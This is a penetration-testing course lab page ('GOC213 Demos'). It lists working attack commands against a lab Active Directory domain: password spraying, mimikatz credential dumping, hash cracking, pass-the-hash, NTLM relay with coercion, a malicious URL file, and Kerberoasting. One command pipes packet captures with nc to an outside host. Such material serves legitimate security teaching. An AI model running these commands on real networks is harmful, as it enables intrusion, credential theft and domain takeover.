---
ref: goc213-demos
title: GOC213 Demos
date: 2022-10-11T11:06:03+00:00
layout: page
lang: sk
permalink: /goc213/
sitemap: false
---

## Table of&nbsp;Contents
{:.no_toc}

* This&nbsp;is&nbsp;a&nbsp;TOC placeholder.
{:toc}

## 0. Lab Environment

### Virtual Machines

Here is&nbsp;a&nbsp;list of&nbsp;VMs you will find in&nbsp;the&nbsp;lab environment:

| Name         | Operating System      | Description                                                |
|--------------|-----------------------|------------------------------------------------------------|
| CONTOSO-DC   | Windows Server 2022   | AD Domain Services (contoso.com)                           |
|              |                       | AD Certificate Services                                    |
|              |                       | OpenSSH Server                                             |
| CONTOSO-DC2  | Windows Server 2022   | AD Domain Services (contoso.com)                           |
| CONTOSO-SRV  | Windows Server 2022   | File Server                                                |
|              |                       | DHCP Server                                                |
|              |                       | Remote Desktop Web Access<br>(https://gateway.contoso.com) |
| CONTOSO-ADFS | Windows Server 2022   | AD Federation Services<br>(https://login.contoso.com)      |
| CONTOSO-PC1  | Windows 11 Enterprise | Domain PC                                                  |
|              |                       | WSL with&nbsp;Kali Linux                                        |
| CONTOSO-PC2  | Windows 11 Enterprise | Domain PC                                                  |
| ADATUM-DC    | Windows Server 2022   | AD Domain Services (adatum.com)                            |

### Credentials

| User              | Password     |
|-------------------|--------------|
| CONTOSO\Admin     | Pa$$w0rd     |
| CONTOSO\bfu       | Pa$$w0rd     |
| CONTOSO\john      | Pa$$w0rd     |
| CONTOSO\baker     | BLF30TUO1GI* |
| ADATUM\Admin      | Pa$$w0rd     |
| CONTOSO-PC1\Admin | Pa$$w0rd     |
| KALI\root         |              |

## 1. Installing Kali Linux Tools

|----------|------------|
| Computer | Kali Linux |

```bash
sudo apt update
sudo apt install apt-transport-https -y
sudo sed --in-place --regexp-extended 's http://http\.kali\.org https://http.kali.org g' /etc/apt/sources.list
sudo apt update
sudo apt install nmap dsniff responder tcpdump ncat bloodhound nbtscan -y
sudo apt install hydra crowbar patator maskprocessor wordlists -y
sudo apt install git chromium iptables -y
sudo apt install crackmapexec python3-pip python3-virtualenv -y

echo 'wireshark-common wireshark-common/install-setuid boolean true' | sudo debconf-set-selections
DEBIAN_FRONTEND=noninteractive sudo apt install wireshark -y

cd ~
git clone https://github.com/fortra/impacket
git clone https://github.com/Wh04m1001/DFSCoerce
git clone https://github.com/dirkjanm/krbrelayx
git clone https://github.com/dirkjanm/PKINITtools

virtualenv ~/env-pytools
~/env-pytools/bin/pip3 install dsinternals lsassy mitm6 minikerberos adidnsdump certipy coercer service_identity

virtualenv ~/env-impacket
~/env-impacket/bin/pip3 install -r ~/impacket/requirements.txt
~/env-impacket/bin/pip3 install ~/impacket

sudo gunzip /usr/share/wordlists/rockyou.txt.gz

echo alias cls=clear > ~/.bash_aliases
```

## 2. Active Directory Discovery

### Google Hacking

<https://www.google.com>
- [inurl:"adfs/ls/idpinitiatedsignon"](https://www.google.com/search?q=inurl%3A"adfs%2Fls%2Fidpinitiatedsignon")
- [inurl:"owa/auth/logon"](https://www.google.com/search?q=inurl%3A"owa%2Fauth%2Flogon")
- [inurl:"RDWeb/Pages"](https://www.google.com/search?q=inurl%3A"RDWeb%2FPages")
- [intitle:"Microsoft Active Directory Certificate Services" inurl:"certsrv/certrqus.asp"](https://www.google.com/search?q=intitle%3A%22Microsoft+Active+Directory+Certificate+Services%22+inurl%3A%22certsrv%2Fcertrqus.asp%22)

### Shodan Queries

<https://www.shodan.io>
- ["adfs/ls"](https://www.shodan.io/search?query=%22adfs%2Fls%22)
- [port:3389 "Remote Desktop Protocol"](https://www.shodan.io/search?query=port%3A3389+%22Remote+Desktop+Protocol%22)
- [port:3389 Administrator](https://www.shodan.io/search?query=port%3A3389+Administrator)

### DNS SRV Record Enumeration

|----------|------------|
| Computer | Kali Linux |

```bash
nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='win.mit.edu'"
nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='contoso.com'"
```

### DNS Zone Transfer

| Computer    | User        | Password |
|-------------|-------------|----------|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```batchfile
nslookup -vc -q=AXFR contoso.com. contoso-dc
```

### AD Integrated DNS Zone Enumeration

|----------|------------|
| Computer | Kali Linux |

```bash
~/env-pytools/bin/adidnsdump --user CONTOSO\\bfu --password 'Pa$$w0rd' --print-zones --ssl contoso-dc.contoso.com
```

```bash
~/env-pytools/bin/adidnsdump --user CONTOSO\\bfu --password 'Pa$$w0rd' --zone contoso.com --ssl --verbose contoso-dc.contoso.com
```

```bash
cat records.csv
```

### DC Basic Port Scan

|----------|------------|
| Computer | Kali Linux |

```bash
nmap contoso-dc
```

### DC Full Port Scan

|----------|------------|
| Computer | Kali Linux |

```bash
nmap -A -T4 -p- -Pn contoso-dc
```

### LDAP Root DSE

|----------|------------|
| Computer | Kali Linux |

```bash
nmap contoso-dc -p 389 --open --script ldap-rootdse
```

### Active NetBIOS Scan

|----------|------------|
| Computer | Kali Linux |

```bash
nmap -sU -p 137 -n --script nbstat -v 10.213.0.0/28
```

```bash
nbtscan -r 10.213.0.0/24
```

### Passive Broadcast Scan

|----------|------------|
| Computer | Kali Linux |

```bash
nmap --script broadcast-listener broadcast-listener.timeout=30
```

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```batchfile
ping contoso-pc3
```

### SMB Server Anonymous Scan

|----------|------------|
| Computer | Kali Linux |

```bash
nmap contoso-dc -p 445 --script smb-protocols,smb2-security-mode,smb2-time
```

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```batchfile
\\local\GOC213\PingCastle_3.1.0.1\pingcastle.exe --scanner smb --server contoso.com --scmode-all
```

### SMB Server Authenticated Scan

|----------|------------|
| Computer | Kali Linux |

```bash
crackmapexec smb '10.213.0.0/28' -u 'bfu' -p 'Pa$$w0rd' -d 'contoso.com' --shares
```

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```batchfile
\\local\GOC213\PingCastle_3.1.0.1\pingcastle.exe --scanner share --server contoso.com --scmode-all
```

### RDP Scan

|----------|------------|
| Computer | Kali Linux |

```bash
nmap contoso-dc -p 3389 --script *rdp*
```

### Port Proxy

| Computer | User | Password |
|-|-|-|
| CONTOSO-DC | CONTOSO\Admin | Pa$$w0rd |

```batchfile
netsh interface portproxy add v4tov4 listenport=50123 connectport=3389 connectaddress=127.0.0.1
netsh interface portproxy show all
```

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```batchfile
mstsc.exe /v:contoso-dc:50123
```

|----------|------------|
| Computer | Kali Linux |

```bash
nmap contoso-dc -p 50123 -Pn -sV
```

### AD Object Enumeration (SAMR)

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```batchfile
net accounts /domain
net user /domain
net group /domain
```

### AD Object Enumeration (LDAP)

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```batchfile
\\local\GOC213\PingCastle_3.1.0.1\pingcastle.exe --scanner computerversion --server contoso.com --scmode-all
type ad_scanner_computerversion_contoso.com.txt
```

|----------|------------|
| Computer | Kali Linux |

```bash
crackmapexec ldap contoso-dc -u 'bfu' -p 'Pa$$w0rd' -d contoso.com --users --groups
```

## 3. Password Spraying / Dictionary Attacks

### Maskprocessor

|----------|------------|
| Computer | Kali Linux |

```bash
mp64 'Pa$$w0r?l' > passwords.txt
echo Password123 >> passwords.txt
echo Hello123 >> passwords.txt

cat passwords.txt
```

```bash
echo "Park
Admin
Wilson
Lott
Whitaker
Ferguson
Fulton" > users.txt

cat users.txt
```

### Remote Desktop Web Access Password Spraying

|----------|------------|
| Computer | Kali Linux |

```bash
hydra -I -V -t 1 -L users.txt -P passwords.txt -u gateway.contoso.com https-post-form "/RDWeb/Pages/en-US/login.aspx:DomainUserName=CONTOSO\\^USER^&UserPass=^PASS^:S=302"
```

### Remote Desktop Gateway Password Spraying

|----------|------------|
| Computer | Kali Linux |

```bash
patator rdp_gateway url=https://gateway.contoso.com/Rpc user_pass=FILE0:FILE1 0=users.txt 1=passwords.txt resolve=gateway.contoso.com:10.213.0.5 -x ignore:code=401 -x quit:code=503
```

### RDP Password Spraying

|----------|------------|
| Computer | Kali Linux |

```bash
crowbar --brute rdp --server 10.213.0.3/32 --usernamefile users.txt --passwdfile passwords.txt
```

### ADFS Password Spraying

|----------|------------|
| Computer | Kali Linux |

```bash
hydra -I -t 1 -L users.txt -P passwords.txt -u 'login.contoso.com' https-post-form '/adfs/ls?wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline:UserName=^USER^@contoso.com&Password=^PASS^&AuthMethod=FormsAuthentication:S=302'
```

### ADFS Credential Stuffing

|----------|------------|
| Computer | Kali Linux |

```bash
hydra -I -vV -t 1 -l 'baker@contoso.com' -p 'BLF30TUO1GI*' -u 'login.contoso.com' https-post-form '/adfs/portal/updatepassword:UserName=^USER^&OldPassword=^PASS^&NewPassword=Passoword123&ConfirmNewPassword=Passoword123&Submit=Submit:S=status=0'
```

### SMB Password Spraying

|----------|------------|
| Computer | Kali Linux |

```bash
patator smb_login host=contoso-dc port=445 user=FILE0 domain=CONTOSO password=FILE1 0=users.txt 1=passwords.txt -x ignore:fgrep='STATUS_LOGON_FAILURE' # -x quit:code=0
```

### Password Audit

| Computer    | User          | Password |
|-------------|---------------|----------|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```powershell
Import-Module -Name \\local\GOC213\DSInternals

"Contoso2022`nGopas2022`nPassword123" > slovnik.txt

Get-ADReplAccount -All -Server contoso-dc |
    Test-PasswordQuality -WeakPasswordsFile slovnik.txt `
                         -WeakPasswordHashesSortedFile \\local\GOC213\pwned-passwords-ntlm-ordered-by-hash-v6.txt
```

## 4. Local Privilege Escalation

### Disable Defender Tamper Protection

| Computer    | User        | Password |
|-------------|-------------|----------|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

*Windows Security*

### DavRelayUp w/ RBCD

| Computer    | User        | Password |
|-------------|-------------|----------|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```batchfile
copy \\local\GOC213\DavRelayUp.exe %temp% /y
%temp%\DavRelayUp.exe --CreateNewComputerAccount --ComputerName CONTOSO-PC4 --ComputerPassword "Password123" --Impersonate Admin --Port 55555 --Verbose
```

### Alternative: Remote Relay with Shadow Credentials

#### Start the WebDAV Client

| Computer    | User        | Password |
|-------------|-------------|----------|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```batchfile
sc query webclient
net use X: http://10.213.0.100/
sc query webclient
```

#### Remote WebDAV Client Scan

|----------|------------|
| Computer | Kali Linux |

```bash
crackmapexec smb 10.213.0.0/28 -u bfu -p 'Pa$$w0rd' -d 'contoso.com' -M webdav
```

#### Prepare for Relay

|----------|------------|
| Computer | Kali Linux |

```bash
sudo ~/env-impacket/bin/ntlmrelayx.py --target ldap://contoso-dc.contoso.com --shadow-credentials --shadow-target 'CONTOSO-PC2$' --dump-laps
```

#### Coerce Computer Authentication

|----------|------------|
| Computer | Kali Linux |

```bash
sudo ~/env-pytools/bin/coercer coerce --username bfu --password 'Pa$$w0rd' --domain 'contoso.com' --target-ip contoso-pc2.contoso.com --listener-ip hacker --always-continue
```

## 5. MITM Attacks

### ARP Spoofing

|----------|------------|
| Computer | Kali Linux |

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo arpspoof -i eth0 -t 10.213.0.3 -r 10.213.0.6
```

### NetworkMiner Remote

|----------|-------|
| Computer | Local |


```batchfile
E:\GOC213\NetworkMiner_2-8\NetworkMiner.exe
```

|----------|------------|
| Computer | Kali Linux |

```bash
tcpdump -i eth0 -s 0 -U -w - | nc 10.213.0.1 57012
```

## 6. NTLM Attacks

### Stealing NT Hashes from&nbsp;LSASS Memory

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```batchfile
\\local\GOC213\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
```

### LSASS Memory Dump File

#### Creating Memory Dump

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```batchfile
taskmgr.exe
```

Copy to&nbsp;`\\local\Loot`

#### Analysis Using Mimikatz

|----------|-------|
| Computer | Local |

```batchfile
E:\GOC213\mimikatz\x64\mimikatz.exe
```

```batchfile
sekurlsa::minidump E:\GOC213\Loot\lsass.dmp
sekurlsa::logonpasswords
```

#### Analysis Using Pypykatz

|----------|------------|
| Computer | Kali Linux |

```bash
mkdir lsass
pypykatz lsa minidump /mnt/c/Users/Admin/AppData/Local/Temp/lsass.DMP -p all -k ./lsass -o ./lsass/creds.txt
ls -l ./lsass
cat ./lsass/creds.txt
```

### SAM Database Dump

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```batchfile
\\local\GOC213\mimikatz\x64\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam"
```

### Stealing the&nbsp;SAM Database

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```batchfile
reg save HKLM\SAM \\local\Loot\SAM
reg save HKLM\SYSTEM \\local\Loot\SYSTEM
```

| Computer |
|-|
| Local |

```batchfile
E:\GOC213\mimikatz\x64\mimikatz.exe
```

```batchfile
lsadump::sam /sam:E:\GOC213\Loot\SAM /system:E:\GOC213\Loot\SYSTEM
```

### NT Hash Cracking

#### Dictionary Attack

| Computer |
|-|
| Local |

```batchfile
E:
cd E:\GOC213\hashcat-6.0.0
echo Pa$$w0rd>>example.dict
hashcat.exe -m 1000 92937945b518814341de3f726500d4ff example.dict --potfile-disable
```

#### Brute-Force Attack

| Computer |
|-|
| Local |

```batchfile
E:
cd E:\GOC213\hashcat-6.0.0
hashcat.exe -m 1000 92937945b518814341de3f726500d4ff -a3 ?a?a?a?a?a?a?a?a --potfile-disable
```

### WMI Pass-the-Hash

#### Kali Linux

|----------|------------|
| Computer | Kali Linux |

```bash
~/env-impacket/bin/wmiexec.py -hashes :92937945b518814341de3f726500d4ff contoso/Admin@contoso-dc
```

```bash
crackmapexec smb 10.213.0.0/28 -u 'Admin' -H 92937945b518814341de3f726500d4ff -d contoso.com -X 'Get-Process -Name lsass' --exec-method wmiexec
```

#### Windows

| Computer |
|-|
| Local |

```batchfile
E:\GOC213\mimikatz\x64\mimikatz.exe
```

```batchfile
privilege::debug
sekurlsa::pth /user:Admin /domain:contoso /ntlm:92937945b518814341de3f726500d4ff /run:cmd.exe
```

### RDP Pass-the-Hash

| Computer |
|-|
| Local |

```batchfile
E:\GOC213\mimikatz\x64\mimikatz.exe
```

```batchfile
privilege::debug
sekurlsa::pth /user:Admin /domain:CONTOSO /ntlm:92937945b518814341de3f726500d4ff /run:"sc \\contoso-dc start  RemoteRegistry"
sekurlsa::pth /user:Admin /domain:CONTOSO /ntlm:92937945b518814341de3f726500d4ff /run:"reg add """\\contoso-dc\HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server""" /v fDenyTSConnections /d 0 /t REG_DWORD /f"
sekurlsa::pth /user:Admin /domain:CONTOSO /ntlm:92937945b518814341de3f726500d4ff /run:"reg add """\\contoso-dc\HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa""" /v DisableRestrictedAdmin /d 0 /t REG_DWORD /f"
sekurlsa::pth /user:Admin /domain:CONTOSO /ntlm:92937945b518814341de3f726500d4ff /run:"mstsc /v:contoso-dc /restrictedAdmin"
```

#### Lateral Movement

|----------|------------|
| Computer | Kali Linux |

```bash
lsassy --username Admin --domain Builtin --hashes 92937945b518814341de3f726500d4ff --dump-method comsvcs '10.213.0.0/28'
```

### Cached Credentials

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```batchfile
\\local\GOC213\mimikatz\x64\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::cache"
```

| Computer |
|-|
| Local |

```batchfile
E:
cd E:\GOC213\hashcat-6.0.0
hashcat.exe -m 2100 $DCC2$10240#Admin#b44ef872b149127d3d469de39259071e example.dict --potfile-disable
```

### LSA Secrets

| Computer | User | Password |
|-|-|-|
| CONTOSO-SRV | CONTOSO\Admin | Pa$$w0rd |

```batchfile
sc create SQLServer binPath= cmd.exe DisplayName= "SQL Server" obj= "CONTOSO\Admin" password= "Pa$$w0rd"
```

```batchfile
reg save HKLM\SECURITY \\local\Loot\SECURITY
reg save HKLM\SYSTEM \\local\Loot\SYSTEM
```

| Computer |
|-|
| Local |

```batchfile
E:\GOC213\mimikatz\x64\mimikatz.exe
```

```batchfile
lsadump::secrets /security:E:\GOC213\Loot\SECURITY /system:E:\GOC213\Loot\SYSTEM
```

### Credential Guard

```batchfile
bcdedit /set hypervisorlaunchtype auto
REM bcdedit /set hypervisorlaunchtype off
REM bcdedit /set loadoptions DISABLE-LSA-ISO
```

### NTLM Traffic Capture

#### Respoder

|----------|------------|
| Computer | Kali Linux |

```bash
sudo responder -I eth0
```

#### Victim

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

- Invoke SMB: `dir \\offline\data`
- Invoke HTTP: `http://intranet`

#### Crack using Hashcat

| Computer |
|-|
| Local |

```batchfile
E:
cd E:\GOC213\hashcat-6.0.0
hashcat.exe -m 5600 Admin::contoso:cd25c01976780f49:AE625016C8D27160205AEA8E15A72D9B:01010000000000008D02A6FA63DDD8013F7196C895DD4E320000000002000800430052005300310001001E00570049004E002D004A0047004C0034005A00590051004800590038004C000400140043005200530031002E004C004F00430041004C0003003400570049004E002D004A0047004C0034005A00590051004800590038004C002E0043005200530031002E004C004F00430041004C000500140043005200530031002E004C004F00430041004C00080030003000000000000000000000000030000028433311FB8B47C230B4FE56E9247FF3FC6037DBBFC255EBE20D9D04DD4176170A0010000000000000000000000000000000000009001A0048005400540050002F0069006E007400720061006E00650074000000000000000000 example.dict --potfile-disable
```

### Using Malicious URL Files

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```powershell
$payload = @'
[InternetShortcut]
URL=https://portal.microsoft.com
WorkingDirectory=C:\
IconFile=\\10.213.0.100\%USERNAME%.icon
IconIndex=1
'@

$file = '\\contoso-srv.contoso.com\Data\Microsoft 365 Portal.url'

Set-Content -Path $file -Value $payload -Encoding UTF8 -Force
```

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```batchfile
explorer \\contoso-srv\data
```

### NTLM Relay with&nbsp;Responder

|----------|------------|
| Computer | Kali Linux |

```bash
sudo ~/env-impacket/bin/ntlmrelayx.py --target contoso-srv -smb2support -c 'net user /add hacker Password123'
```

```bash
sudo responder -I eth0
```

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

<http://intranet>

### NTLM Relay with&nbsp;ARP Spoofing

|----------|------------|
| Computer | Kali Linux |

```bash
# Enable routing
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Perform MITM
sudo arpspoof -i eth0 -t 10.213.0.3 -r 10.213.0.6

# Catch SMB traffic
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 445 -j REDIRECT --to-port 8445

# Relay to CONTOSO-SRV
sudo ~/env-impacket/bin/ntlmrelayx.py --target contoso-srv -smb2support --no-http-server --smb-port 8445
```

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```batchfile
dir \\contoso-dc.contoso.com\SYSVOL
```

|----------|------------|
| Computer | Kali Linux |

```bash
# Check the results
cat contoso-srv_samhashes.sam

# Cleanup
sudo iptables -t nat -F
```

### DFSCoerce

#### NTLM Relay to&nbsp;CA Web Enrollment

| Computer |
|-|
| Kali Linux |

```bash
sudo ~/env-impacket/bin/ntlmrelayx.py --adcs --target http://contoso-dc.contoso.com/certsrv --template KerberosAuthentication -smb2support
```

#### Ask DC to&nbsp;Connect

| Computer |
|-|
| Kali Linux |

```bash
sudo ~/env-pytools/bin/python3 DFSCoerce/dfscoerce.py -u bfu -p 'Pa$$w0rd' -d contoso.com 10.213.0.100 contoso-dc2.contoso.com
```

OR

```bash
sudo ~/env-pytools/bin/coercer coerce --username bfu --password 'Pa$$w0rd' --domain 'contoso.com' --target-ip contoso-dc2.contoso.com --listener-ip 10.213.0.100 --filter-transport-name msrpc --filter-pipe-name '\PIPE\netdfs' --always-continue
```

#### Copy Certificate to Windows

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```batch
copy "\\wsl.localhost\kali-linux\root\CONTOSO-DC2$.pfx" "\\local\Loot\"
```

#### Kerberos PKINIT

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```batchfile
\\local\GOC213\GhostPack\Rubeus.exe asktgt /user:CONTOSO-DC2$ /ptt /getcredentials /certificate:"\\local\Loot\CONTOSO-DC2$.pfx"
```

#### DCSync

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```powershell
Install-Module -Name DSInternals -Scope CurrentUser -Force
Get-ADReplAccount -All -Server contoso-dc.contoso.com
```

### Wildcard DNS Record

|----------|------------|
| Computer | Kali Linux |

```bash
~/env-pytools/bin/python3 krbrelayx/dnstool.py --user 'CONTOSO\bfu' --password 'Pa$$w0rd' --action add --record '*' --data 10.213.0.100 contoso-dc.contoso.com
```

```bash
~/env-pytools/bin/python3 krbrelayx/dnstool.py --user 'CONTOSO\bfu' --password 'Pa$$w0rd' --action query --record '*' contoso-dc.contoso.com
```

```bash
sudo ~/env-impacket/bin/ntlmrelayx.py --target ldap://contoso-dc.contoso.com --shadow-credentials --shadow-target 'Admin'
```

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```batchfile
ping www.contoso.com
ping abcd1234
REM Go to http://intranet
```

| Computer | User | Password |
|-|-|-|
| CONTOSO-DC | CONTOSO\Admin | Pa$$w0rd |

Use the&nbsp;`dnsmgmt.msc` and&nbsp;`dsa.msc` consoles to&nbsp;check out the&nbsp;results.

## 7. Kerberos Attacks

### Pass-the-Key

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```batchfile
\\local\GOC213\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::ekeys"
```

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```batchfile
klist purge
\\local\GOC213\GhostPack\Rubeus.exe asktgt /user:Admin /domain:contoso.com /ptt /enctype:AES256 /aes256:74aa09422b8b6e96779b2ffcddb7292bf24d23da4290af7d76c914c3f79b1d94
klist
dir \\contoso-dc\c$
klist
```

### Overpass-the-Hash

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC1 | CONTOSO\Admin | Pa$$w0rd |

```batchfile
\\local\GOC213\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::msv"
```

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```batchfile
klist purge
\\local\GOC213\GhostPack\Rubeus.exe asktgt /user:Admin /domain:contoso.com /ptt /enctype:AES256 /rc4:92937945b518814341de3f726500d4ff
klist
dir \\contoso-dc\c$
klist
```

### Kerberoasting

#### Rubeus Kerberoast

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```batchfile
\\local\GOC213\GhostPack\Rubeus.exe kerberoast /domain:contoso.com /delay:5000 /jitter:30 /ldaps /nowrap
```

#### Cracking using Hashcat

| Computer |
|-|
| Local |

```batchfile
E:
cd E:\GOC213\hashcat-6.0.0
hashcat.exe -m 13100 $krb5tgs$23$*Admin$contoso.com$MSSQLSvc/pc3.contoso.com@contoso.com*$DA2270972143237D2603793BAEDD39E1$F95617C620EE0F708F3C56228A77810DC165CE5C20BFDE1B3258041CF594995C2791CCBBF5E736C6E465645AE3B07FE37A35B6AD02D1BA957CA45EC5172CEEE11AFC26A86C5008AFC9D6DD28B844D91546B0C75165BA3C084CE13934FA19E46E43FD23045EE58FBB8432276ADBC1B65DBFD1FB208E7ED5D6B5C2372E433CC8E22290381C82E2C186D37673E748733F7CB0EC1B60EB3466B1EFCFAC872FD4A394D738AA33CB4587DEA8E0546F78ACC9884A6A368EC407B5D63B5BC1315118475D818EEA087367BC0966A9D11F0374AD694F9DCA920F90CDAB07576B3154B035367837A666611826CF347A7E7BC79299F5DBDFB4436725A641CF0244D826144E38A8E3A413B9B7174B35AFF6EE7878F20E7FB0D231D90C3A2EB01EB9A04E6CB75F2A16B3573151281F851D3FBABBDDB6CF816C5127F1A24B924FD9D2BDE6095590379638394A7D97F771A210B4651243EC565415FDD805E2C95463BC2E6DAF99111E1733AE16F81334751DEE399F7276FC514A561979FECACC2404A6243FCA597286AAE6A8299319CEDF48AD1FC890E99F4974B7A4030BB8E25D2CDA0D6D48BCB9DA3B611CDA6559DC7E5343E8C834D05A2C970E670B19AC7DB5EF1E89E6BD17912C5BB322EC968269144FEEF01EFCB251FC252CA3A7CB64F8F42A130FE637122A059910D5B552CAEA06D6539ED894054C47F3219E71636C6A0926A6603A827AE771AAAC898588EAD40E723FB1A59C3E86FCF567F7D211EAEBCE2ED8D3E615EC373BAD52E597E2092A201E327916503CE141F17982D390E24FF001BA000813FA9952613061DF34AAE89FDEBDAE8E44FA583CF26E903D394AD916D8617C08E1EB8110E0C22F2E72ACE701B2BFEF8A23C17557C1BF6B470BCB057BB77948C8DBBEB6E7D4D6F590274A600DC618028C42E6C82FC38B5B1BA329DB67031EEACE52BF95B1C716CCAEF3BBD21041F9C90E446B7EC6CA0CA698815AFF0AD5EF2ED9575E584C13FA79C842C4694CCFE5995363AEE072DED36108D555271707323A34AFF53B7A542A33A5C1E10B08B244E6BD366B82A111A465FFDA7B24CE464EF20A9BA563F2D06962F005D49CCA2A524B3C4344E88355224EDA7969D29D82B7E6A48A49183E06A680908F33F8C3D83E65A70A154627F634A87D8D0B3C8EDABD004BE4BE32D86319C60EB72FF47C69383D000670FFA23809C5E34C2C65284AB199299FBE20C612A792D3A605A6AABBA149128798B3357061831AD575772E0405796197774D395DACEE67C9E0C5E0EA697BEBE4BF4BE92C1C573810EB813B9D45C2382BD652FD4675A064129CE9E5F30967D7A4E00809E8CE8D6BF3BFCAE8DB24BFCC7EEAE3C51FC4979AA1ED6F831605AE4314CC070EAAF618C385B92AF8F4BB09ED426F338379CE180CDDC4E46C94CD68083AD614ABC8123AC92796EA6D29674127903C0266BFC2AEAEF9B14F8BD0CF20C091EC972C1A17C58C09EE93525E4BBECFBA67E6103834691028F3D295DC9205C25364C8F523E15B08A82E055509976D61D8A5828E2023E187A898421331256D78019527DA03590C92937E8F14F1E501F7224F21B90A79F6E5BB44538CD9ACE8B1BD7E4BD4010490BAF8FF967847F2E2DB5B698CA671CA1F892484C919EE0EF47927CA3F1BC9CBFAEF7BF3406986098C6E687193EC4522FB7394421E96A7D209D7AC4D45A90EE1FB00BC007EFCDF18749055D61AD620E202123366EB18C22C612635C402F94C86D991E43132A1C60CFDE266AAAB377DE5B853C6632B6B85EEFDC16B436394464C875661E1CE47B4FF239B9AB8239819E1400F60382F117A1EBB5000E829ABE72A4FE5C1E57F3241976D0B860974EDF4CCD48673BE8B731F245C5B767B9AA178CAF806A753597512FB6B56BC2CE9BC53BE35BE48406034150B673B005E1FCE6D80190511A30CC8E20CFC4E1F1109C264 example.dict --potfile-disable
```

#### Identifying Misconfigured Accounts

| Computer | User | Password |
|-|-|-|
| CONTOSO-DC | CONTOSO\Admin | Pa$$w0rd |

```powershell
Get-ADUser -Filter { servicePrincipalName -like '*' -and Enabled -eq $true } `
           -Properties servicePrincipalName,UseDESKeyOnly,KerberosEncryptionType |
    Format-Table -Property SamAccountName,servicePrincipalName,UseDESKeyOnly,KerberosEncryptionType
```

### AS-REP Roasting

| Computer | User | Password |
|-|-|-|
| CONTOSO-PC2 | CONTOSO\bfu | Pa$$w0rd |

```batchfile
\\local\GOC213\GhostPack\Rubeus.exe asreproast /ldaps /nowrap
```

| Computer |
|-|
| Local |

```batchfile
E:
cd E:\GOC213\hashcat-6.0.0
REM Do not forget to add $23$
hashcat.exe -m 18200 $krb5asrep$23$Admin@contoso.com:5e0461d78edc07a2e0ff201697079d90$21cabe76284c1ca7369c150c691176b5ef99d7a6859d98bf41371424adb3b3ff648e8821b6729fa1b9bcdf9edf07e4d53516cef88f80c6d592d75d0a3178009a98a62b7f219c8b60e34d32054c92fde68f88241247e73a2637c31142a4190db1ab382f443d9cedb1bebc00a5901ad0156c5af515bd046e1f298dab23c827433e8532bb186edeff2f07844d37f972a4bf099b3f2a6e3cedd9c9463aa9095f15d30f7c9ecbf9cf0af240fe85a4a8ed3cd6a0a2ca5636f99c7dc69273bd4a5dd8bedf43a6dafcb42abcba4543a1382199460fec7c2291d3fa78fc860eab83e33c28aaca3db7ddaf452be241 example.dict --potfile-disable
```

### Using KDC Proxy

| Computer |
|-|
| Local |

```batchfile
